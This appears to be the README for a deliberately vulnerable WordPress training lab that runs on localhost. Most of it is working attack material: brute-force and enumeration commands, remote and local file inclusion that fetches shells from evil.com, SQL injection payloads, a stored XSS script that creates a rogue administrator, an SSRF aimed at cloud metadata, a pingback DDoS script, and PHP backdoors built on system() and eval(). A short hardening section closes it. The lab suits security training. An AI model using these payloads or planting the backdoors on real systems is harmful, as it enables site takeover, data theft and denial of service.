# WordPress Vulnerable

## Overview
A deliberately vulnerable WordPress installation with common misconfigurations, outdated plugins, weak themes, and multiple attack vectors for learning WordPress security.

## Quick Start

**Access URL**: http://localhost:8087

**Admin Panel**: http://localhost:8087/wp-admin

**Default Credentials**:
- Admin: `admin` / `admin123`
- Editor: `editor` / `editor123`
- Author: `author` / `author123`
- Subscriber: `user` / `user123`

**Initial Setup**:
1. Access http://localhost:8087
2. If prompted, complete WordPress installation
3. Use the default admin credentials above

## Common WordPress Vulnerabilities

### 1. Outdated Core & Plugins
```bash
# Enumerate version
curl -s http://localhost:8087/ | grep -i "generator"
curl http://localhost:8087/readme.html

# WPScan enumeration
wpscan --url http://localhost:8087 --enumerate vp,vt,u
```

### 2. User Enumeration
```bash
# Via author pages
curl http://localhost:8087/?author=1
curl http://localhost:8087/?author=2

# Via REST API
curl http://localhost:8087/wp-json/wp/v2/users

# Via login error messages
curl -X POST http://localhost:8087/wp-login.php \
  -d "log=admin&pwd=wrongpass"
```

### 3. Weak Login Security
```bash
# Brute force with WPScan
wpscan --url http://localhost:8087 \
  --usernames admin,editor \
  --passwords passwords.txt \
  --max-threads 10

# XML-RPC brute force
curl -X POST http://localhost:8087/xmlrpc.php \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>admin</value></param>
    <param><value>password123</value></param>
  </params>
</methodCall>'
```

### 4. Plugin Vulnerabilities

#### Contact Form 7 - File Upload
```bash
# Unrestricted file upload
curl -X POST http://localhost:8087/wp-content/plugins/contact-form-7/upload.php \
  -F "file=@shell.php"
```

#### TimThumb - RFI/LFI
```bash
# Remote file inclusion
http://localhost:8087/wp-content/themes/vulnerable/timthumb.php?src=http://evil.com/shell.php

# Local file inclusion
http://localhost:8087/wp-content/themes/vulnerable/timthumb.php?src=../../../../wp-config.php
```

#### Backup Plugins
```bash
# Find backup files
curl http://localhost:8087/wp-content/backups/
curl http://localhost:8087/wp-content/backup-db/
wget http://localhost:8087/backup.sql
wget http://localhost:8087/wp-content/database.sql
```

### 5. Theme Vulnerabilities

#### Arbitrary File Read
```php
// Vulnerable theme file
$file = $_GET['file'];
include($file);

// Exploit
http://localhost:8087/wp-content/themes/vulnerable/download.php?file=../../../../wp-config.php
```

#### Template Injection
```php
// Unsafe template rendering
eval('?>' . file_get_contents($_GET['template']));

// Exploit
http://localhost:8087/wp-content/themes/vulnerable/render.php?template=http://evil.com/shell.txt
```

### 6. SQL Injection

#### Plugin SQLi
```bash
# In vulnerable plugin parameter
http://localhost:8087/wp-content/plugins/vulnerable/search.php?id=1' OR '1'='1

# Extract data
http://localhost:8087/wp-content/plugins/vulnerable/search.php?id=1' UNION SELECT user_login,user_pass FROM wp_users--
```

#### Search SQLi
```bash
# WordPress search
http://localhost:8087/?s=test%' UNION SELECT 1,2,3,4,5--
```

### 7. Cross-Site Scripting (XSS)

#### Stored XSS in Comments
```html
<!-- Post comment -->
<script>
fetch('/wp-admin/user-new.php')
  .then(r => r.text())
  .then(html => {
    const nonce = html.match(/name="_wpnonce_create-user" value="([^"]+)"/)[1];
    fetch('/wp-admin/user-new.php', {
      method: 'POST',
      credentials: 'include',
      body: new URLSearchParams({
        'user_login': 'hacker',
        'email': 'hacker@evil.com',
        'pass1': 'hacked123',
        'pass2': 'hacked123',
        'role': 'administrator',
        '_wpnonce_create-user': nonce,
        'action': 'createuser'
      })
    });
  });
</script>
```

#### Reflected XSS
```bash
# In search
http://localhost:8087/?s=<script>alert(document.cookie)</script>

# In plugin parameters
http://localhost:8087/wp-content/plugins/vulnerable/page.php?msg=<script>alert(1)</script>
```

### 8. File Upload Vulnerabilities

#### Media Upload Bypass
```php
// Upload PHP disguised as image
cp shell.php shell.php.jpg
# Then rename after upload via plugin vulnerability
```

#### Plugin Upload Points
```bash
# Find upload endpoints
find /var/www/html -name "*.php" -exec grep -l "move_uploaded_file\|file_put_contents" {} \;
```

### 9. XML-RPC Exploitation

#### Pingback SSRF
```xml
POST /xmlrpc.php HTTP/1.1
Content-Type: application/xml

<?xml version="1.0"?>
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param><value>http://localhost:8087/?p=1</value></param>
    <param><value>http://169.254.169.254/latest/meta-data/</value></param>
  </params>
</methodCall>
```

#### Amplification Attack
```python
# DDoS via pingback
import requests

xml = """<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
""" + "<value><struct><member><name>methodName</name><value>pingback.ping</value></member><member><name>params</name><value><array><data><value>http://target.com</value><value>http://localhost:8087/?p=1</value></data></array></value></member></struct></value>" * 1000 + """
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>"""

requests.post('http://localhost:8087/xmlrpc.php', data=xml)
```

### 10. REST API Vulnerabilities

#### Information Disclosure
```bash
# List all posts (including drafts)
curl http://localhost:8087/wp-json/wp/v2/posts?status=draft

# User information
curl http://localhost:8087/wp-json/wp/v2/users

# Media files
curl http://localhost:8087/wp-json/wp/v2/media
```

#### Unauthorized Modifications
```bash
# If REST API authentication is weak
curl -X POST http://localhost:8087/wp-json/wp/v2/posts \
  -H "Content-Type: application/json" \
  -d '{"title":"Hacked","content":"Pwned","status":"publish"}'
```

## Advanced Exploitation

### 1. wp-config.php Exposure
```bash
# Common backup locations
curl http://localhost:8087/wp-config.php.bak
curl http://localhost:8087/wp-config.php.save
curl http://localhost:8087/wp-config.php~
curl http://localhost:8087/.wp-config.php.swp
```

### 2. Database Extraction
```bash
# Via SQL injection
sqlmap -u "http://localhost:8087/?p=1" --batch --dump

# Via exposed backups
wget http://localhost:8087/backup/database.sql
wget http://localhost:8087/wp-content/mysql.sql
```

### 3. Privilege Escalation
```php
// Exploit vulnerable plugin to add admin
global $wpdb;
$wpdb->insert($wpdb->users, array(
    'user_login' => 'hacker',
    'user_pass' => wp_hash_password('hacked'),
    'user_email' => 'hacker@evil.com',
    'user_registered' => current_time('mysql'),
    'user_status' => 0,
    'display_name' => 'Hacker'
));

$user_id = $wpdb->insert_id;
$wpdb->insert($wpdb->usermeta, array(
    'user_id' => $user_id,
    'meta_key' => 'wp_capabilities',
    'meta_value' => 'a:1:{s:13:"administrator";b:1;}'
));
```

### 4. Backdoor Installation
```php
// Simple backdoor in theme
// Add to functions.php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
    die();
}

// Access: http://localhost:8087/?cmd=id
```

## Security Misconfigurations

### 1. Directory Listing
```bash
# Exposed directories
http://localhost:8087/wp-content/uploads/
http://localhost:8087/wp-content/plugins/
http://localhost:8087/wp-includes/
```

### 2. Weak File Permissions
```bash
# Writable files
find /var/www/html -type f -perm -o+w
find /var/www/html -type d -perm -o+w
```

### 3. Debug Mode Enabled
```php
// wp-config.php
define('WP_DEBUG', true);
define('WP_DEBUG_LOG', true);
define('WP_DEBUG_DISPLAY', true);

// Exposes errors at:
http://localhost:8087/wp-content/debug.log
```

### 4. Database Credentials
```php
// Often found in:
// - wp-config.php
// - .env files
// - Git history
// - Backup files
```

## Automated Exploitation

### WPScan Commands
```bash
# Full scan
wpscan --url http://localhost:8087 \
  --enumerate ap,at,cb,dbe,u \
  --plugins-detection aggressive \
  --api-token YOUR_TOKEN

# Specific plugin scan
wpscan --url http://localhost:8087 \
  --enumerate p \
  --plugins-list vulnerable-plugin

# Password attack
wpscan --url http://localhost:8087 \
  --passwords rockyou.txt \
  --usernames admin,editor \
  --max-threads 50
```

### Metasploit Modules
```bash
# Scanner
use auxiliary/scanner/http/wordpress_scanner
use auxiliary/scanner/http/wordpress_login_enum

# Exploits
use exploit/unix/webapp/wp_admin_shell_upload
use exploit/unix/webapp/wp_ajax_load_more_file_upload
```

## Post-Exploitation

### Persistence
```bash
# Create admin user via wp-cli (if accessible)
wp user create backdoor backdoor@evil.com --role=administrator --user_pass=hacked123

# Add to wp-config.php
define('WP_BACKDOOR', true);
if (defined('WP_BACKDOOR') && isset($_GET['backdoor'])) {
    eval($_GET['backdoor']);
}
```

### Data Exfiltration
```bash
# Export database
mysqldump -u wpuser -p wordpress > dump.sql

# Export files
tar -czf wordpress-backup.tar.gz /var/www/html/
```

## Mitigation

### Security Hardening
1. Keep WordPress, themes, and plugins updated
2. Remove unused themes and plugins
3. Use strong passwords and 2FA
4. Disable file editing in wp-config.php
5. Disable XML-RPC if not needed
6. Implement proper file permissions
7. Use security plugins (Wordfence, Sucuri)
8. Regular backups
9. Web Application Firewall (WAF)
10. Disable directory browsing

### wp-config.php Security
```php
// Disable file editing
define('DISALLOW_FILE_EDIT', true);

// Disable plugin/theme installation
define('DISALLOW_FILE_MODS', true);

// Force SSL admin
define('FORCE_SSL_ADMIN', true);

// Disable debug
define('WP_DEBUG', false);

// Security keys (generate from https://api.wordpress.org/secret-key/1.1/salt/)
```

## Learning Objectives
- WordPress security architecture
- Plugin and theme vulnerabilities
- CMS-specific attack vectors
- Privilege escalation techniques
- Post-exploitation persistence

## Additional Resources
- [WordPress Security Whitepaper](https://wordpress.org/about/security/)
- [WPScan](https://wpscan.com/)
- [WordPress Vulnerability Database](https://wpsecure.net/) 